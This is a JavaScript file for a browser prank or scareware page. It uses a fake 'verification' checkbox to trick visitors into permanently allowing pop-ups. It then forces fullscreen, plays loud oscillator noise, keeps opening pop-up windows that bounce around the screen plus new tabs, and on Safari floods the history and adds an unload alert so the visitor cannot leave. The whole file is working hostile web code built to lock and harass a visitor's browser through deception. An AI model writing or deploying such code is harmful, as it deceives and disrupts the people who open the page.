const overlay = document.getElementById('overlay');
const debugLog = document.getElementById('debug-log');
let audioContext;
let isPopup = new URLSearchParams(window.location.search).get('type') === 'popup';

// Simple Safari Detection
const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);

// --- Logger ---
function log(msg) {
    if (debugLog && !isPopup) {
        console.log(msg);
    }
}

// --- Audio ---
function playSound() {
    try {
        if (!audioContext) return;
        if (audioContext.state === 'suspended') audioContext.resume();
        const osc = audioContext.createOscillator();
        const gain = audioContext.createGain();
        osc.frequency.setValueAtTime(200 + Math.random() * 800, audioContext.currentTime);
        osc.frequency.exponentialRampToValueAtTime(100, audioContext.currentTime + 0.1);
        osc.type = 'sawtooth';
        gain.gain.setValueAtTime(0.1, audioContext.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.1);
        osc.connect(gain);
        gain.connect(audioContext.destination);
        osc.start();
        osc.stop(audioContext.currentTime + 0.1);
    } catch (e) { }
}

// --- Spawning Logic (Chaos) ---
function spawnPopup() {
    // Safari block popups heavily, skip unless user action
    if (isSafari) return;

    const w = 300;
    const h = 300;
    const left = Math.random() * (window.screen.availWidth - w);
    const top = Math.random() * (window.screen.availHeight - h);
    let url = window.location.href;
    if (!url.includes('type=popup')) url += (url.includes('?') ? '&' : '?') + 'type=popup';

    // 1. Moving Popup
    window.open(url, '_blank', `width=${w},height=${h},left=${left},top=${top},menubar=no,toolbar=no,location=no,status=no,resizable=no`);

    // 2. Tab Chaos
    try { window.open(url, '_blank'); } catch (e) { }
}

// --- Popup Window Behavior ---
function initPopupBehavior() {
    document.body.classList.add('active'); // Flash
    if (overlay) overlay.style.display = 'none';

    try {
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        setInterval(playSound, 200);
    } catch (e) { }

    let vx = (Math.random() - 0.5) * 60;
    let vy = (Math.random() - 0.5) * 60;
    if (Math.abs(vx) < 15) vx = 30;

    setInterval(() => {
        window.moveBy(vx, vy);
        if (window.screenX <= 0 || window.screenX + window.outerWidth >= window.screen.availWidth) vx *= -1;
        if (window.screenY <= 0 || window.screenY + window.outerHeight >= window.screen.availHeight) vy *= -1;
    }, 50);

    document.body.innerHTML = `
        <div style="position:relative;width:100%;height:100%;background:black;overflow:hidden;cursor:pointer;">
            <img src="creepy_face.png" style="width:100%;height:100%;object-fit:cover;" alt="YOU ARE AN IDIOT">
            <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:white;font-size:30px;font-weight:bold;text-shadow:2px 2px 0 #000;white-space:nowrap;pointer-events:none;">
                omotigo on top
            </div>
        </div>
    `;

    window.addEventListener('click', () => {
        spawnPopup();
        spawnPopup();
        if (audioContext && audioContext.state === 'suspended') audioContext.resume();
    });
}

// --- Main Page Chaos Start ---
function startMain() {
    log("CHAOS STARTED");
    try {
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        audioContext.resume();
        setInterval(playSound, 200);
    } catch (e) { }

    document.body.classList.add('active');
    overlay.style.display = 'none';

    window.addEventListener('mousedown', () => {
        // Try fullscreen again if lost
        if (!document.fullscreenElement) {
            try { document.documentElement.requestFullscreen().catch(() => { }); } catch (e) { }
        }

        // Safari: re-arm history trap on click
        if (isSafari) {
            history.pushState(null, null, location.href);
        } else {
            spawnPopup();
        }

        if (audioContext && audioContext.state === 'suspended') audioContext.resume();
    });

    if (isSafari) {
        // --- Safari Specific Chaos (Trap) ---
        // 1. History Bombing (Disable Back Button)
        for (let i = 0; i < 20; i++) {
            history.pushState(null, document.title, location.href);
        }

        window.addEventListener('popstate', function (event) {
            // Prevent going back
            history.pushState(null, document.title, location.href);
            // Annoyance
            playSound();
        });

        // 2. Before Unload Alert
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.returnValue = ''; // Standard way to trigger alert
            return '';
        });

    } else {
        // Normal Chaos
        for (let i = 0; i < 3; i++) spawnPopup();
        setInterval(() => {
            spawnPopup();
        }, 800);
    }
}

// --- Verification Flow (HTTPS Compatible) ---
function initMainBehavior() {
    const checkbox = document.getElementById('verify-check');
    const btn = document.getElementById('allow-btn');
    const messageBox = document.querySelector('.message');

    if (!checkbox || !btn) {
        if (overlay) overlay.addEventListener('click', startMain);
        return;
    }

    checkbox.addEventListener('change', (e) => {
        if (e.target.checked) {
            btn.disabled = false;
            btn.style.cursor = 'pointer';
            btn.style.opacity = '1';
            btn.style.background = '#0F9D58';
        } else {
            btn.disabled = true;
            btn.style.cursor = 'not-allowed';
            btn.style.opacity = '0.6';
            btn.style.background = '#4285f4';
        }
    });

    btn.addEventListener('click', () => {
        // Go Fullscreen
        try { document.documentElement.requestFullscreen().catch(() => { }); } catch (e) { }

        // Safari Shortcut: No popup check, just start trapping.
        if (isSafari) {
            btn.textContent = "認証成功";
            btn.style.background = '#0F9D58';
            checkbox.disabled = true;
            setTimeout(() => { startMain(); }, 300);
            return;
        }

        btn.disabled = true;
        btn.textContent = "確認中..."; // Checking...

        // SYNCHRONOUS DOUBLE-CHECK STRATEGY
        let w1 = null;
        let w2 = null;

        try {
            w1 = window.open('about:blank', 'test1', 'width=50,height=50,left=0,top=0');
            w2 = window.open('about:blank', 'test2', 'width=50,height=50,left=100,top=0');
        } catch (e) {
            console.error(e);
        }

        // Evaluate
        let w1_ok = w1 && !w1.closed && w1.innerHeight !== 0;
        let w2_ok = w2 && !w2.closed && w2.innerHeight !== 0;

        // Cleanup
        if (w1) w1.close();
        if (w2) w2.close();

        if (w1_ok && w2_ok) {
            // SUCCESS
            log("Permission Verified: Double Check Passed.");
            btn.textContent = "認証成功"; // VERIFIED
            btn.style.background = '#0F9D58';
            checkbox.disabled = true;

            setTimeout(() => {
                startMain();
            }, 500);

        } else {
            // BLOCKED
            log(`Permission Denied. (1:${w1_ok}, 2:${w2_ok})`);

            // Allow retry
            btn.disabled = false;
            btn.style.cursor = 'pointer';
            btn.textContent = "⚠ 再試行（ポップアップがブロックされました）⚠"; // RETRY
            btn.style.background = '#db4437';

            // Show instruction
            if (!document.getElementById('block-warning')) {
                const help = document.createElement('div');
                help.id = 'block-warning';
                help.style.cssText = 'color:#d32f2f; font-weight:bold; margin-top:15px; border:2px dashed #d32f2f; padding:10px; font-size:12px; text-align:left; background:#fff0f0;';
                help.innerHTML = `
                    <div style="font-size:14px; margin-bottom:5px;">🚫 <strong>ポップアップがブロックされました</strong></div>
                    ブラウザがウィンドウをブロックしました。<br>
                    <br>
                    <strong>許可する方法：</strong>
                    <ol style="padding-left:20px; margin:5px 0;">
                        <li>アドレスバーの 🚫 または 🔒 アイコンをクリックしてください。</li>
                        <li><strong>「権限」</strong>または<strong>「ポップアップとリダイレクト」</strong>を選択してください。</li>
                        <li><strong>「常に許可」</strong>に設定してください。</li>
                        <li><strong>もう一度上のボタンをクリックしてください。</strong></li>
                    </ol>
                `;
                messageBox.appendChild(help);
            }
        }
    });
}

if (isPopup) {
    initPopupBehavior();
} else {
    initMainBehavior();
}
